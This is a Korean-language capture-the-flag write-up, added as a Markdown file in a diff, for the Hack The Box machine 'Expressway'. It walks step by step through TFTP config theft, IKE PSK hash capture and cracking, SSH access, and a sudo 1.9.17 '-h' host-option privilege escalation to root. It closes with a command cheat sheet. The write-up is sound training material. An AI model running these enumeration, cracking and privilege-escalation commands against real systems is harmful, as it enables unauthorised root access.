@@ -1,0 +1,831 @@
+# HTB Expressway 상세 풀이 정리
+
+> 이 문서는 **HTB Expressway** 머신을 처음부터 끝까지 다시 따라갈 수 있도록  
+> **명령어 + 결과 해석 + 왜 그렇게 하는지**를 함께 정리한 문서입니다.  
+> flag 값은 포함하지 않았습니다.
+
+---
+
+# 0. 전체 공격 흐름 요약
+
+이 머신의 전체 흐름은 아래와 같습니다.
+
+1. **TCP 스캔**
+   - SSH(22)만 열려 있음
+   - 바로 로그인은 불가
+
+2. **UDP 스캔**
+   - TFTP(69), IKE/ISAKMP(500), NAT-T(4500) 확인
+
+3. **TFTP 열거**
+   - 인증 없이 설정 파일(`ciscortr.cfg`) 다운로드
+
+4. **설정 파일 분석**
+   - `ike` 사용자 존재 확인
+   - 호스트명 `expressway` 확인
+   - IKE / IPsec가 PSK 방식으로 동작함을 확인
+
+5. **IKE 분석**
+   - `ike-scan`으로 PSK 기반 인증 구조 확인
+   - Aggressive Mode 응답 및 해시 추출 가능
+
+6. **초기 접근**
+   - `ike` 계정으로 SSH 접속 후 `user.txt` 획득
+
+7. **권한 상승 전 내부 열거**
+   - `sudo -l`은 권한 없음
+   - `sudo -V`로 sudo 버전 확인
+   - `id` 결과에서 `proxy` 그룹 발견
+
+8. **로그 분석**
+   - `proxy` 그룹이 읽을 수 있는 squid 로그 확인
+   - `offramp.expressway.htb` 호스트명 발견
+
+9. **Privilege Escalation**
+   - sudo 1.9.17의 `-h` 관련 취약점 이용
+   - `offramp.expressway.htb` 기준 권한을 조회
+   - `NOPASSWD: ALL` 확인 후 root shell 획득
+
+---
+
+# 1. TCP 스캔
+
+먼저 일반적인 TCP 스캔부터 진행합니다.
+
+```bash
+nmap -sC -sV 10.129.238.52
+```
+
+예시 결과:
+
+```text
+22/tcp open  ssh  OpenSSH 10.0p2 Debian 8
+```
+
+## 해석
+
+- 외부에서 보이는 TCP 서비스는 **SSH 하나뿐**입니다.
+- 웹 서비스(80, 443)가 없고, FTP/SMB 같은 흔한 서비스도 없습니다.
+- 따라서 바로 웹 취약점이나 파일 공유 취약점을 노리기 어렵습니다.
+
+## 왜 다음에 UDP를 봐야 하나
+
+TCP에서 얻을 수 있는 정보가 거의 없기 때문입니다.
+
+이럴 때는 다음을 의심해야 합니다.
+
+- UDP 서비스가 열려 있을 수 있음
+- VPN/IKE/TFTP 같은 네트워크 장비 관련 서비스가 숨겨져 있을 수 있음
+- 외부 노출은 적지만 설정 실수로 정보 유출이 있을 수 있음
+
+즉, 이 머신은 **TCP만 보면 막히는 구조**입니다.
+
+---
+
+# 2. UDP 스캔
+
+UDP 상위 포트를 확인합니다.
+
+```bash
+nmap -sU --top-ports 20 10.129.238.52
+```
+
+예시 결과:
+
+```text
+69/udp    open|filtered tftp
+500/udp   open          isakmp
+4500/udp  open|filtered nat-t-ike
+```
+
+## 해석
+
+### 69/udp - TFTP
+- TFTP는 매우 단순한 파일 전송 프로토콜입니다.
+- 기본적으로 인증 기능이 없습니다.
+- 설정 파일, 부트 이미지, 네트워크 장비 구성 파일이 올라가 있는 경우가 많습니다.
+
+### 500/udp - IKE / ISAKMP
+- IKE는 IPsec VPN에서 키 교환과 인증에 사용됩니다.
+- PSK(Pre-Shared Key) 기반이면 잘못된 구성 시 해시를 추출하거나 공격에 활용할 수 있습니다.
+
+### 4500/udp - NAT-T
+- NAT 환경에서 IPsec을 터널링할 때 자주 사용됩니다.
+- 500번과 함께 보이면 VPN 구성이 있다고 의심할 수 있습니다.
+
+## 핵심 판단
+
+이 머신의 공격 포인트는 아래 두 가지입니다.
+
+1. **TFTP를 통한 파일 유출**
+2. **IKE를 통한 VPN 인증 구조 분석**
+
+---
+
+# 3. TFTP 열거
+
+처음에는 TFTP에 `ls`, `dir` 같은 명령을 써보고 싶어질 수 있습니다.  
+하지만 TFTP는 **디렉터리 목록 조회 기능이 없습니다**.
+
+즉:
+
+- 서버 안에 어떤 파일이 있는지 직접 나열할 수 없음
+- **파일 이름을 알고 있거나 추측해서 요청**해야 함
+
+## TFTP 접속
+
+```bash
+tftp 10.129.238.52
+```
+
+그 다음 설정 파일을 직접 요청합니다.
+
+```bash
+get ciscortr.cfg
+quit
+```
+
+## 왜 `ciscortr.cfg`를 시도하나
+
+이건 다음 이유 때문입니다.
+
+- Cisco 라우터/장비 계열 문제
+- TFTP 서비스 노출
+- 설정 파일 이름 패턴이 자주 고정됨
+- 문제 풀이 문맥상 config 파일이 핵심일 가능성이 높음
+
+## 다운로드 후 확인
+
+```bash
+cat ciscortr.cfg
+```
+
+---
+
+# 4. 설정 파일 분석
+
+설정 파일에서 중요한 부분은 전부 다 볼 필요가 없습니다.  
+공격과 관련 있는 정보만 추출하면 됩니다.
+
+## 4.1 사용자 정보
+
+```text
+username ike password *****
+```
+
+### 해석
+- 시스템 또는 장비에 `ike`라는 계정이 존재합니다.
+- 이후 SSH 접속 시도에 사용할 수 있습니다.
+
+---
+
+## 4.2 호스트명
+
+```text
+hostname expressway
+```
+
+### 해석
+- 현재 시스템의 이름이 `expressway`라는 뜻입니다.
+- 이후 내부 환경 분석이나 다른 호스트명과 비교할 때 중요합니다.
+
+---
+
+## 4.3 IKE 인증 방식
+
+```text
+crypto isakmp policy 1
+        encryption 3des
+        authentication pre-share
+        group 2
+```
+
+### 해석
+- IKE가 활성화되어 있습니다.
+- 인증 방식이 `pre-share`, 즉 **PSK 기반**입니다.
+- 따라서 IKE 서비스에 대해 `ike-scan`을 통한 추가 열거가 가능합니다.
+
+---
+
+## 4.4 PSK 관련 설정
+
+설정 파일에는 PSK와 관련된 항목도 보입니다.
+
+예를 들어 다음과 같은 구조가 나올 수 있습니다.
+
+```text
+crypto isakmp client configuration group rtr-remote
+        key secret-password
+```
+
+또는
+
+```text
+crypto ipsec client ezvpn ezvpnclient
+        group 2 key secret-password
+```
+
+### 해석
+- 여기서 나오는 값은 **SSH 비밀번호가 아니라 IKE/VPN용 공유키(PSK)** 입니다.
+- 이 부분이 헷갈리기 쉽습니다.
+
+## 매우 중요한 구분
+
+### 이것은 SSH 계정 정보
+```text
+username ike password *****
+```
+
+### 이것은 IKE/VPN용 PSK
+```text
+key secret-password
+```
+
+즉, `secret-password`를 SSH 비밀번호로 넣었는데 실패하는 것은 정상일 수 있습니다.  
+왜냐하면 그 값은 **VPN 인증용 비밀키**일 수 있기 때문입니다.
+
+---
+
+# 5. IKE 서비스 열거
+
+설정 파일에서 IKE 사용 사실을 확인했으므로 실제로 서비스가 어떻게 응답하는지 봅니다.
+
+```bash
+ike-scan -M 10.129.238.52
+```
+
+## 기대하는 포인트
+
+출력에서 보통 이런 항목을 확인합니다.
+
+- `Auth=PSK`
+- `Enc=3DES`
+- `Hash=SHA1`
+- Group 정보
+
+### 해석
+- 이 장비는 IKE Main Mode로 응답합니다.
+- PSK 방식이라는 사실을 다시 검증할 수 있습니다.
+
+---
+
+## Aggressive Mode로 해시 추출
+
+```bash
+ike-scan -M -A --pskcrack=hash.txt 10.129.238.52
+```
+
+또는 경우에 따라 ID를 지정할 수도 있습니다.
+
+```bash
+ike-scan -M -A --id=rtr-remote --pskcrack=hash.txt 10.129.238.52
+```
+
+## 결과
+
+- `hash.txt`에 IKE PSK 크랙용 해시가 저장됩니다.
+
+```bash
+cat hash.txt
+```
+
+## 왜 이 단계가 필요한가
+
+IKE가 PSK 기반일 때:
+
+1. 해시를 추출하고
+2. 오프라인에서 크랙한 뒤
+3. 평문 PSK를 확인할 수 있습니다.
+
+이 머신에서는 설정 파일에서 PSK가 이미 보이는 상황이므로  
+해시 크랙은 **검증 또는 연습용 의미**가 더 큽니다.
+
+---
+
+# 6. hashcat 시도와 의미
+
+보통 다음처럼 시도합니다.
+
+```bash
+hashcat -m 5400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+## `-m 5400` 의미
+- IKE-PSK 해시 타입
+
+## 발생 가능 문제
+
+### 1. rockyou.txt 없음
+```text
+/usr/share/wordlists/rockyou.txt: No such file or directory
+```
+
+해결:
+
+```bash
+ls /usr/share/wordlists
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+
+### 2. 메모리 부족
+```text
+Not enough allocatable device memory
+```
+
+해석:
+- 현재 환경에서 hashcat이 CPU/OpenCL로 돌아가는데 메모리가 부족한 상황입니다.
+- 이 경우 굳이 크랙을 끝까지 밀지 않아도 됩니다.
+- 이미 설정 파일에서 구조를 확인했기 때문에 전체 흐름 이해에는 큰 문제가 없습니다.
+
+---
+
+# 7. Initial Access - SSH 접속
+
+이후 `ike` 계정으로 SSH 접속을 시도합니다.
+
+```bash
+ssh ike@10.129.238.52
+```
+
+접속에 성공하면 `user.txt`를 획득할 수 있습니다.
+
+```bash
+cat ~/user.txt
+```
+
+## 이 단계에서 중요한 점
+
+초기 접근이 된 순간부터는 외부 공격이 아니라 **내부 열거(Local Enumeration)** 단계로 넘어갑니다.
+
+이후 해야 하는 일은 다음과 같습니다.
+
+- 현재 사용자 권한 확인
+- sudo 권한 확인
+- 그룹 확인
+- 읽을 수 있는 로그/설정 파일 확인
+- privilege escalation 경로 탐색
+
+---
+
+# 8. 내부 열거
+
+## 8.1 현재 계정 정보
+
+```bash
+whoami
+id
+groups
+```
+
+예시:
+
+```text
+uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
+```
+
+## 해석
+
+- 현재 사용자는 `ike`
+- 추가 그룹으로 `proxy`에 속함
+
+### 왜 `proxy` 그룹이 중요하나
+
+리눅스에서 그룹은 단순한 이름이 아니라 **접근 권한의 범위**를 의미합니다.
+
+즉:
+
+- 일반 사용자는 못 보는 파일도
+- 특정 그룹에 속하면 읽을 수 있을 수 있습니다.
+
+`proxy` 그룹이라면 보통 squid 프록시 로그, spool 디렉터리 등을 읽을 수 있는 경우가 있습니다.
+
+---
+
+## 8.2 sudo 권한 확인
+
+```bash
+sudo -l
+```
+
+예시 결과:
+
+```text
+Sorry, user ike may not run sudo on expressway.
+```
+
+### 해석
+- 현재 호스트 `expressway` 기준으로는 특별한 sudo 권한이 없습니다.
+- 즉, 일반적인 `sudo bash` 같은 방식은 불가능합니다.
+
+---
+
+## 8.3 sudo 버전 확인
+
+```bash
+sudo -V
+```
+
+예시 결과:
+
+```text
+Sudo version 1.9.17
+```
+
+### 해석
+- sudo 버전이 1.9.17입니다.
+- 이 버전은 문제 문맥상 **CVE-2025-32462**와 연결됩니다.
+
+여기서부터가 권한 상승의 핵심입니다.
+
+---
+
+# 9. sudo 취약점 이해 (가장 중요한 부분)
+
+이 머신에서 root를 딸 수 있었던 핵심은  
+**sudo 1.9.17의 `-h` 옵션 관련 취약점**입니다.
+
+## 9.1 정상적인 `sudo -l`
+
+```bash
+sudo -l
+```
+
+이 명령은 보통 **현재 호스트에서 내가 어떤 sudo 권한을 가지는지** 보여줍니다.
+
+즉 지금 머신이 `expressway`라면:
+
+- `expressway` 기준 권한만 보여줍니다.
+
+---
+
+## 9.2 `sudo -h`는 무엇인가
+
+`-h` 옵션은 **다른 호스트(host) 기준의 sudo 권한**을 조회하는 기능입니다.
+
+예:
+
+```bash
+sudo -h somehost -l
+```
+
+이 말은:
+
+> "`somehost`라는 호스트 기준으로 내가 어떤 sudo 권한을 가지는지 보여줘"
+
+원래는 이런 멀티 호스트 sudoers 환경에서만 의미가 있습니다.
+
+예를 들어 `/etc/sudoers`에 이런 식의 정책이 있을 수 있습니다.
+
+```text
+ike offramp = (root) NOPASSWD: ALL
+```
+
+즉:
+- `expressway`에서는 권한 없음
+- `offramp`에서는 root 권한 있음
+
+정상이라면 이 권한은 **offramp에서만 의미**가 있어야 합니다.
+
+---
+
+## 9.3 취약점이 왜 문제인가
+
+문제는 취약한 sudo에서는:
+
+- 다른 host 기준 권한을 조회할 수 있을 뿐 아니라
+- **그 권한으로 실제 실행까지 가능해지는 것처럼 동작**합니다.
+
+즉:
+
+- 현재 나는 `expressway`에 있음
+- 그런데 `offramp`에서 허용된 권한을 가져다 써서
+- `expressway`에서 root 명령을 실행해버릴 수 있음
+
+이게 권한 경계 붕괴입니다.
+
+---
+
+# 10. 그런데 왜 `offramp.expressway.htb`를 찾아야 하나
+
+여기서 자연스럽게 드는 질문이 있습니다.
+
+> `sudo -h <hostname>`에 넣을 hostname은 어디서 구하나?
+
+정답: **로그에서 찾습니다.**
+
+---
+
+# 11. proxy 그룹을 이용한 로그 접근
+
+현재 사용자가 `proxy` 그룹에 속하므로  
+그 그룹이 읽을 수 있는 파일을 찾습니다.
+
+```bash
+find / -group proxy 2>/dev/null
+```
+
+또는 노이즈를 줄여서:
+
+```bash
+find / -group proxy 2>/dev/null | grep -v '/proc\|/sys\|/run'
+```
+
+예시로 다음이 보일 수 있습니다.
+
+```text
+/var/log/squid/access.log.1
+/var/log/squid/cache.log.1
+```
+
+## 해석
+
+- squid 프록시 로그를 읽을 수 있습니다.
+- 프록시 로그에는 내부/외부 접근 기록이 남습니다.
+- 그 안에 **내부 호스트명**이 있을 수 있습니다.
+
+---
+
+# 12. squid 로그 분석
+
+먼저 디렉터리를 확인합니다.
+
+```bash
+ls -al /var/log/squid/
+```
+
+예시:
+
+```text
+access.log.1
+access.log.2.gz
+cache.log.1
+cache.log.2.gz
+```
+
+## 주의할 점
+
+- `access.log`가 없다고 끝이 아닙니다.
+- 로그가 rotate되어 `access.log.1`, `access.log.2.gz` 등으로 남아 있을 수 있습니다.
+
+그래서 다음을 봅니다.
+
+```bash
+cat /var/log/squid/access.log.1
+```
+
+또는 필요한 줄만 보려면:
+
+```bash
+grep -i http /var/log/squid/access.log.1
+grep -i expressway /var/log/squid/access.log.1
+grep -i htb /var/log/squid/access.log.1
+```
+
+## 여기서 찾는 것
+
+예를 들어 이런 줄:
+
+```text
+GET http://offramp.expressway.htb
+```
+
+### 해석
+- squid 프록시를 통해 `offramp.expressway.htb` 호스트에 접근한 흔적이 있습니다.
+- 이 호스트명은 내부 환경에서 실제로 쓰이는 이름일 가능성이 높습니다.
+- 즉, `sudo -h`에 넣을 후보가 됩니다.
+
+---
+
+# 13. 취약점 실제 사용
+
+hostname을 찾았으니 권한을 조회합니다.
+
+```bash
+sudo -h offramp.expressway.htb -l
+```
+
+예시 결과:
+
+```text
+Matching Defaults entries for ike on offramp:
+    env_reset, mail_badpass, secure_path=...
+User ike may run the following commands on offramp:
+    (root) NOPASSWD: ALL
+    (root) NOPASSWD: ALL
+```
+
+## 해석
+
+이 출력은 아주 중요합니다.
+
+뜻은:
+
+> `offramp`라는 호스트 기준으로 보면  
+> `ike` 사용자는 root로 어떤 명령이든 비밀번호 없이 실행할 수 있다.
+
+즉:
+- `expressway`에서는 안 되던 것이
+- `offramp` 기준으로는 됩니다.
+
+---
+
+# 14. root shell 획득
+
+이제 같은 방식으로 bash를 실행합니다.
+
+```bash
+sudo -h offramp.expressway.htb bash
+```
+
+그 다음 확인:
+
+```bash
+whoami
+```
+
+결과:
+
+```text
+root
+```
+
+이제 root 권한을 얻었습니다.
+
+그리고 최종적으로:
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+# 15. 여기서 제일 헷갈리는 부분 다시 정리
+
+## 질문 1. 왜 로그를 봤나
+현재 머신에서 바로 sudo 권한이 없었기 때문입니다.
+
+즉:
+- `sudo -l` → 실패
+- 그럼 우회 가능한 다른 정보가 필요
+- `proxy` 그룹으로 읽을 수 있는 로그에서 힌트 탐색
+
+---
+
+## 질문 2. 왜 hostname이 중요했나
+취약점의 핵심이 `sudo -h <hostname>` 이기 때문입니다.
+
+즉:
+- hostname 없으면 `-h`에 넣을 값이 없음
+- 그래서 로그에서 host 이름을 찾아야 함
+
+---
+
+## 질문 3. 왜 다른 host 권한이 여기서 먹히나
+정상이라면 먹히면 안 됩니다.
+
+하지만 이 취약점에서는:
+- 다른 host 기준 권한 조회
+- 그 권한이 현재 호스트에서도 실행에 반영되는 문제
+
+즉, **host 분리 경계가 무너진 상태**입니다.
+
+---
+
+# 16. 전체 흐름을 한 번에 다시 정리
+
+## Step 1. TCP 스캔
+```bash
+nmap -sC -sV 10.129.238.52
+```
+- SSH만 보임
+- 바로 안 들어가짐
+
+## Step 2. UDP 스캔
+```bash
+nmap -sU --top-ports 20 10.129.238.52
+```
+- TFTP, IKE 확인
+
+## Step 3. TFTP 파일 획득
+```bash
+tftp 10.129.238.52
+get ciscortr.cfg
+```
+- 설정 파일 유출
+
+## Step 4. 설정 파일 분석
+```bash
+cat ciscortr.cfg
+```
+- `ike` 사용자 확인
+- `expressway` 호스트명 확인
+- IKE / PSK 구조 확인
+
+## Step 5. IKE 열거
+```bash
+ike-scan -M 10.129.238.52
+ike-scan -M -A --pskcrack=hash.txt 10.129.238.52
+```
+- PSK 기반 인증 재확인
+- 해시 추출 가능
+
+## Step 6. SSH 접근
+```bash
+ssh ike@10.129.238.52
+```
+- 초기 쉘 획득
+- `user.txt` 획득
+
+## Step 7. 내부 열거
+```bash
+sudo -l
+sudo -V
+id
+```
+- sudo 직접 권한 없음
+- sudo 1.9.17
+- proxy 그룹 소속 확인
+
+## Step 8. 로그 탐색
+```bash
+find / -group proxy 2>/dev/null
+cat /var/log/squid/access.log.1
+```
+- `offramp.expressway.htb` 발견
+
+## Step 9. sudo 취약점
+```bash
+sudo -h offramp.expressway.htb -l
+sudo -h offramp.expressway.htb bash
+```
+- 다른 host 기준 NOPASSWD: ALL 확인
+- root shell 획득
+
+## Step 10. flag 획득
+```bash
+cat /root/root.txt
+```
+
+---
+
+# 17. 핵심 포인트 5개만 기억하면 됨
+
+1. **TCP만 보면 안 풀리는 머신이었다.**
+2. **TFTP는 인증 없이 설정 파일을 유출했다.**
+3. **설정 파일이 IKE와 계정 정보를 알려줬다.**
+4. **초기 쉘 이후 `proxy` 그룹이 내부 호스트 힌트를 줬다.**
+5. **sudo 1.9.17의 `-h` 취약점으로 다른 host 권한을 현재 시스템에서 써서 root가 됐다.**
+
+---
+
+# 18. 시험/면접용 한 줄 설명
+
+> Expressway는 UDP 서비스(TFTP, IKE) 열거가 핵심인 머신으로,  
+> TFTP를 통해 설정 파일을 획득하고 IKE/계정 정보를 확인한 뒤 SSH foothold를 얻는다.  
+> 이후 `proxy` 그룹으로 squid 로그를 읽어 내부 호스트명을 찾고,  
+> sudo 1.9.17의 `-h` 취약점을 이용해 다른 호스트 기준 sudo 권한을 현재 호스트에서 악용하여 root를 획득한다.
+
+---
+
+# 19. 최소 명령어 치트시트
+
+```bash
+# TCP
+nmap -sC -sV 10.129.238.52
+
+# UDP
+nmap -sU --top-ports 20 10.129.238.52
+
+# TFTP
+tftp 10.129.238.52
+get ciscortr.cfg
+quit
+
+# Config 분석
+cat ciscortr.cfg
+
+# IKE
+ike-scan -M 10.129.238.52
+ike-scan -M -A --pskcrack=hash.txt 10.129.238.52
+
+# SSH
+ssh ike@10.129.238.52
+
+# 내부 열거
+sudo -l
+sudo -V
+id
+find / -group proxy 2>/dev/null | grep -v '/proc\|/sys\|/run'
+
+# 로그
+ls -al /var/log/squid/
+cat /var/log/squid/access.log.1
+grep -i htb /var/log/squid/access.log.1
+
+# Privesc
+sudo -h offramp.expressway.htb -l
+sudo -h offramp.expressway.htb bash
+
+# Flag
+cat /root/root.txt
+```
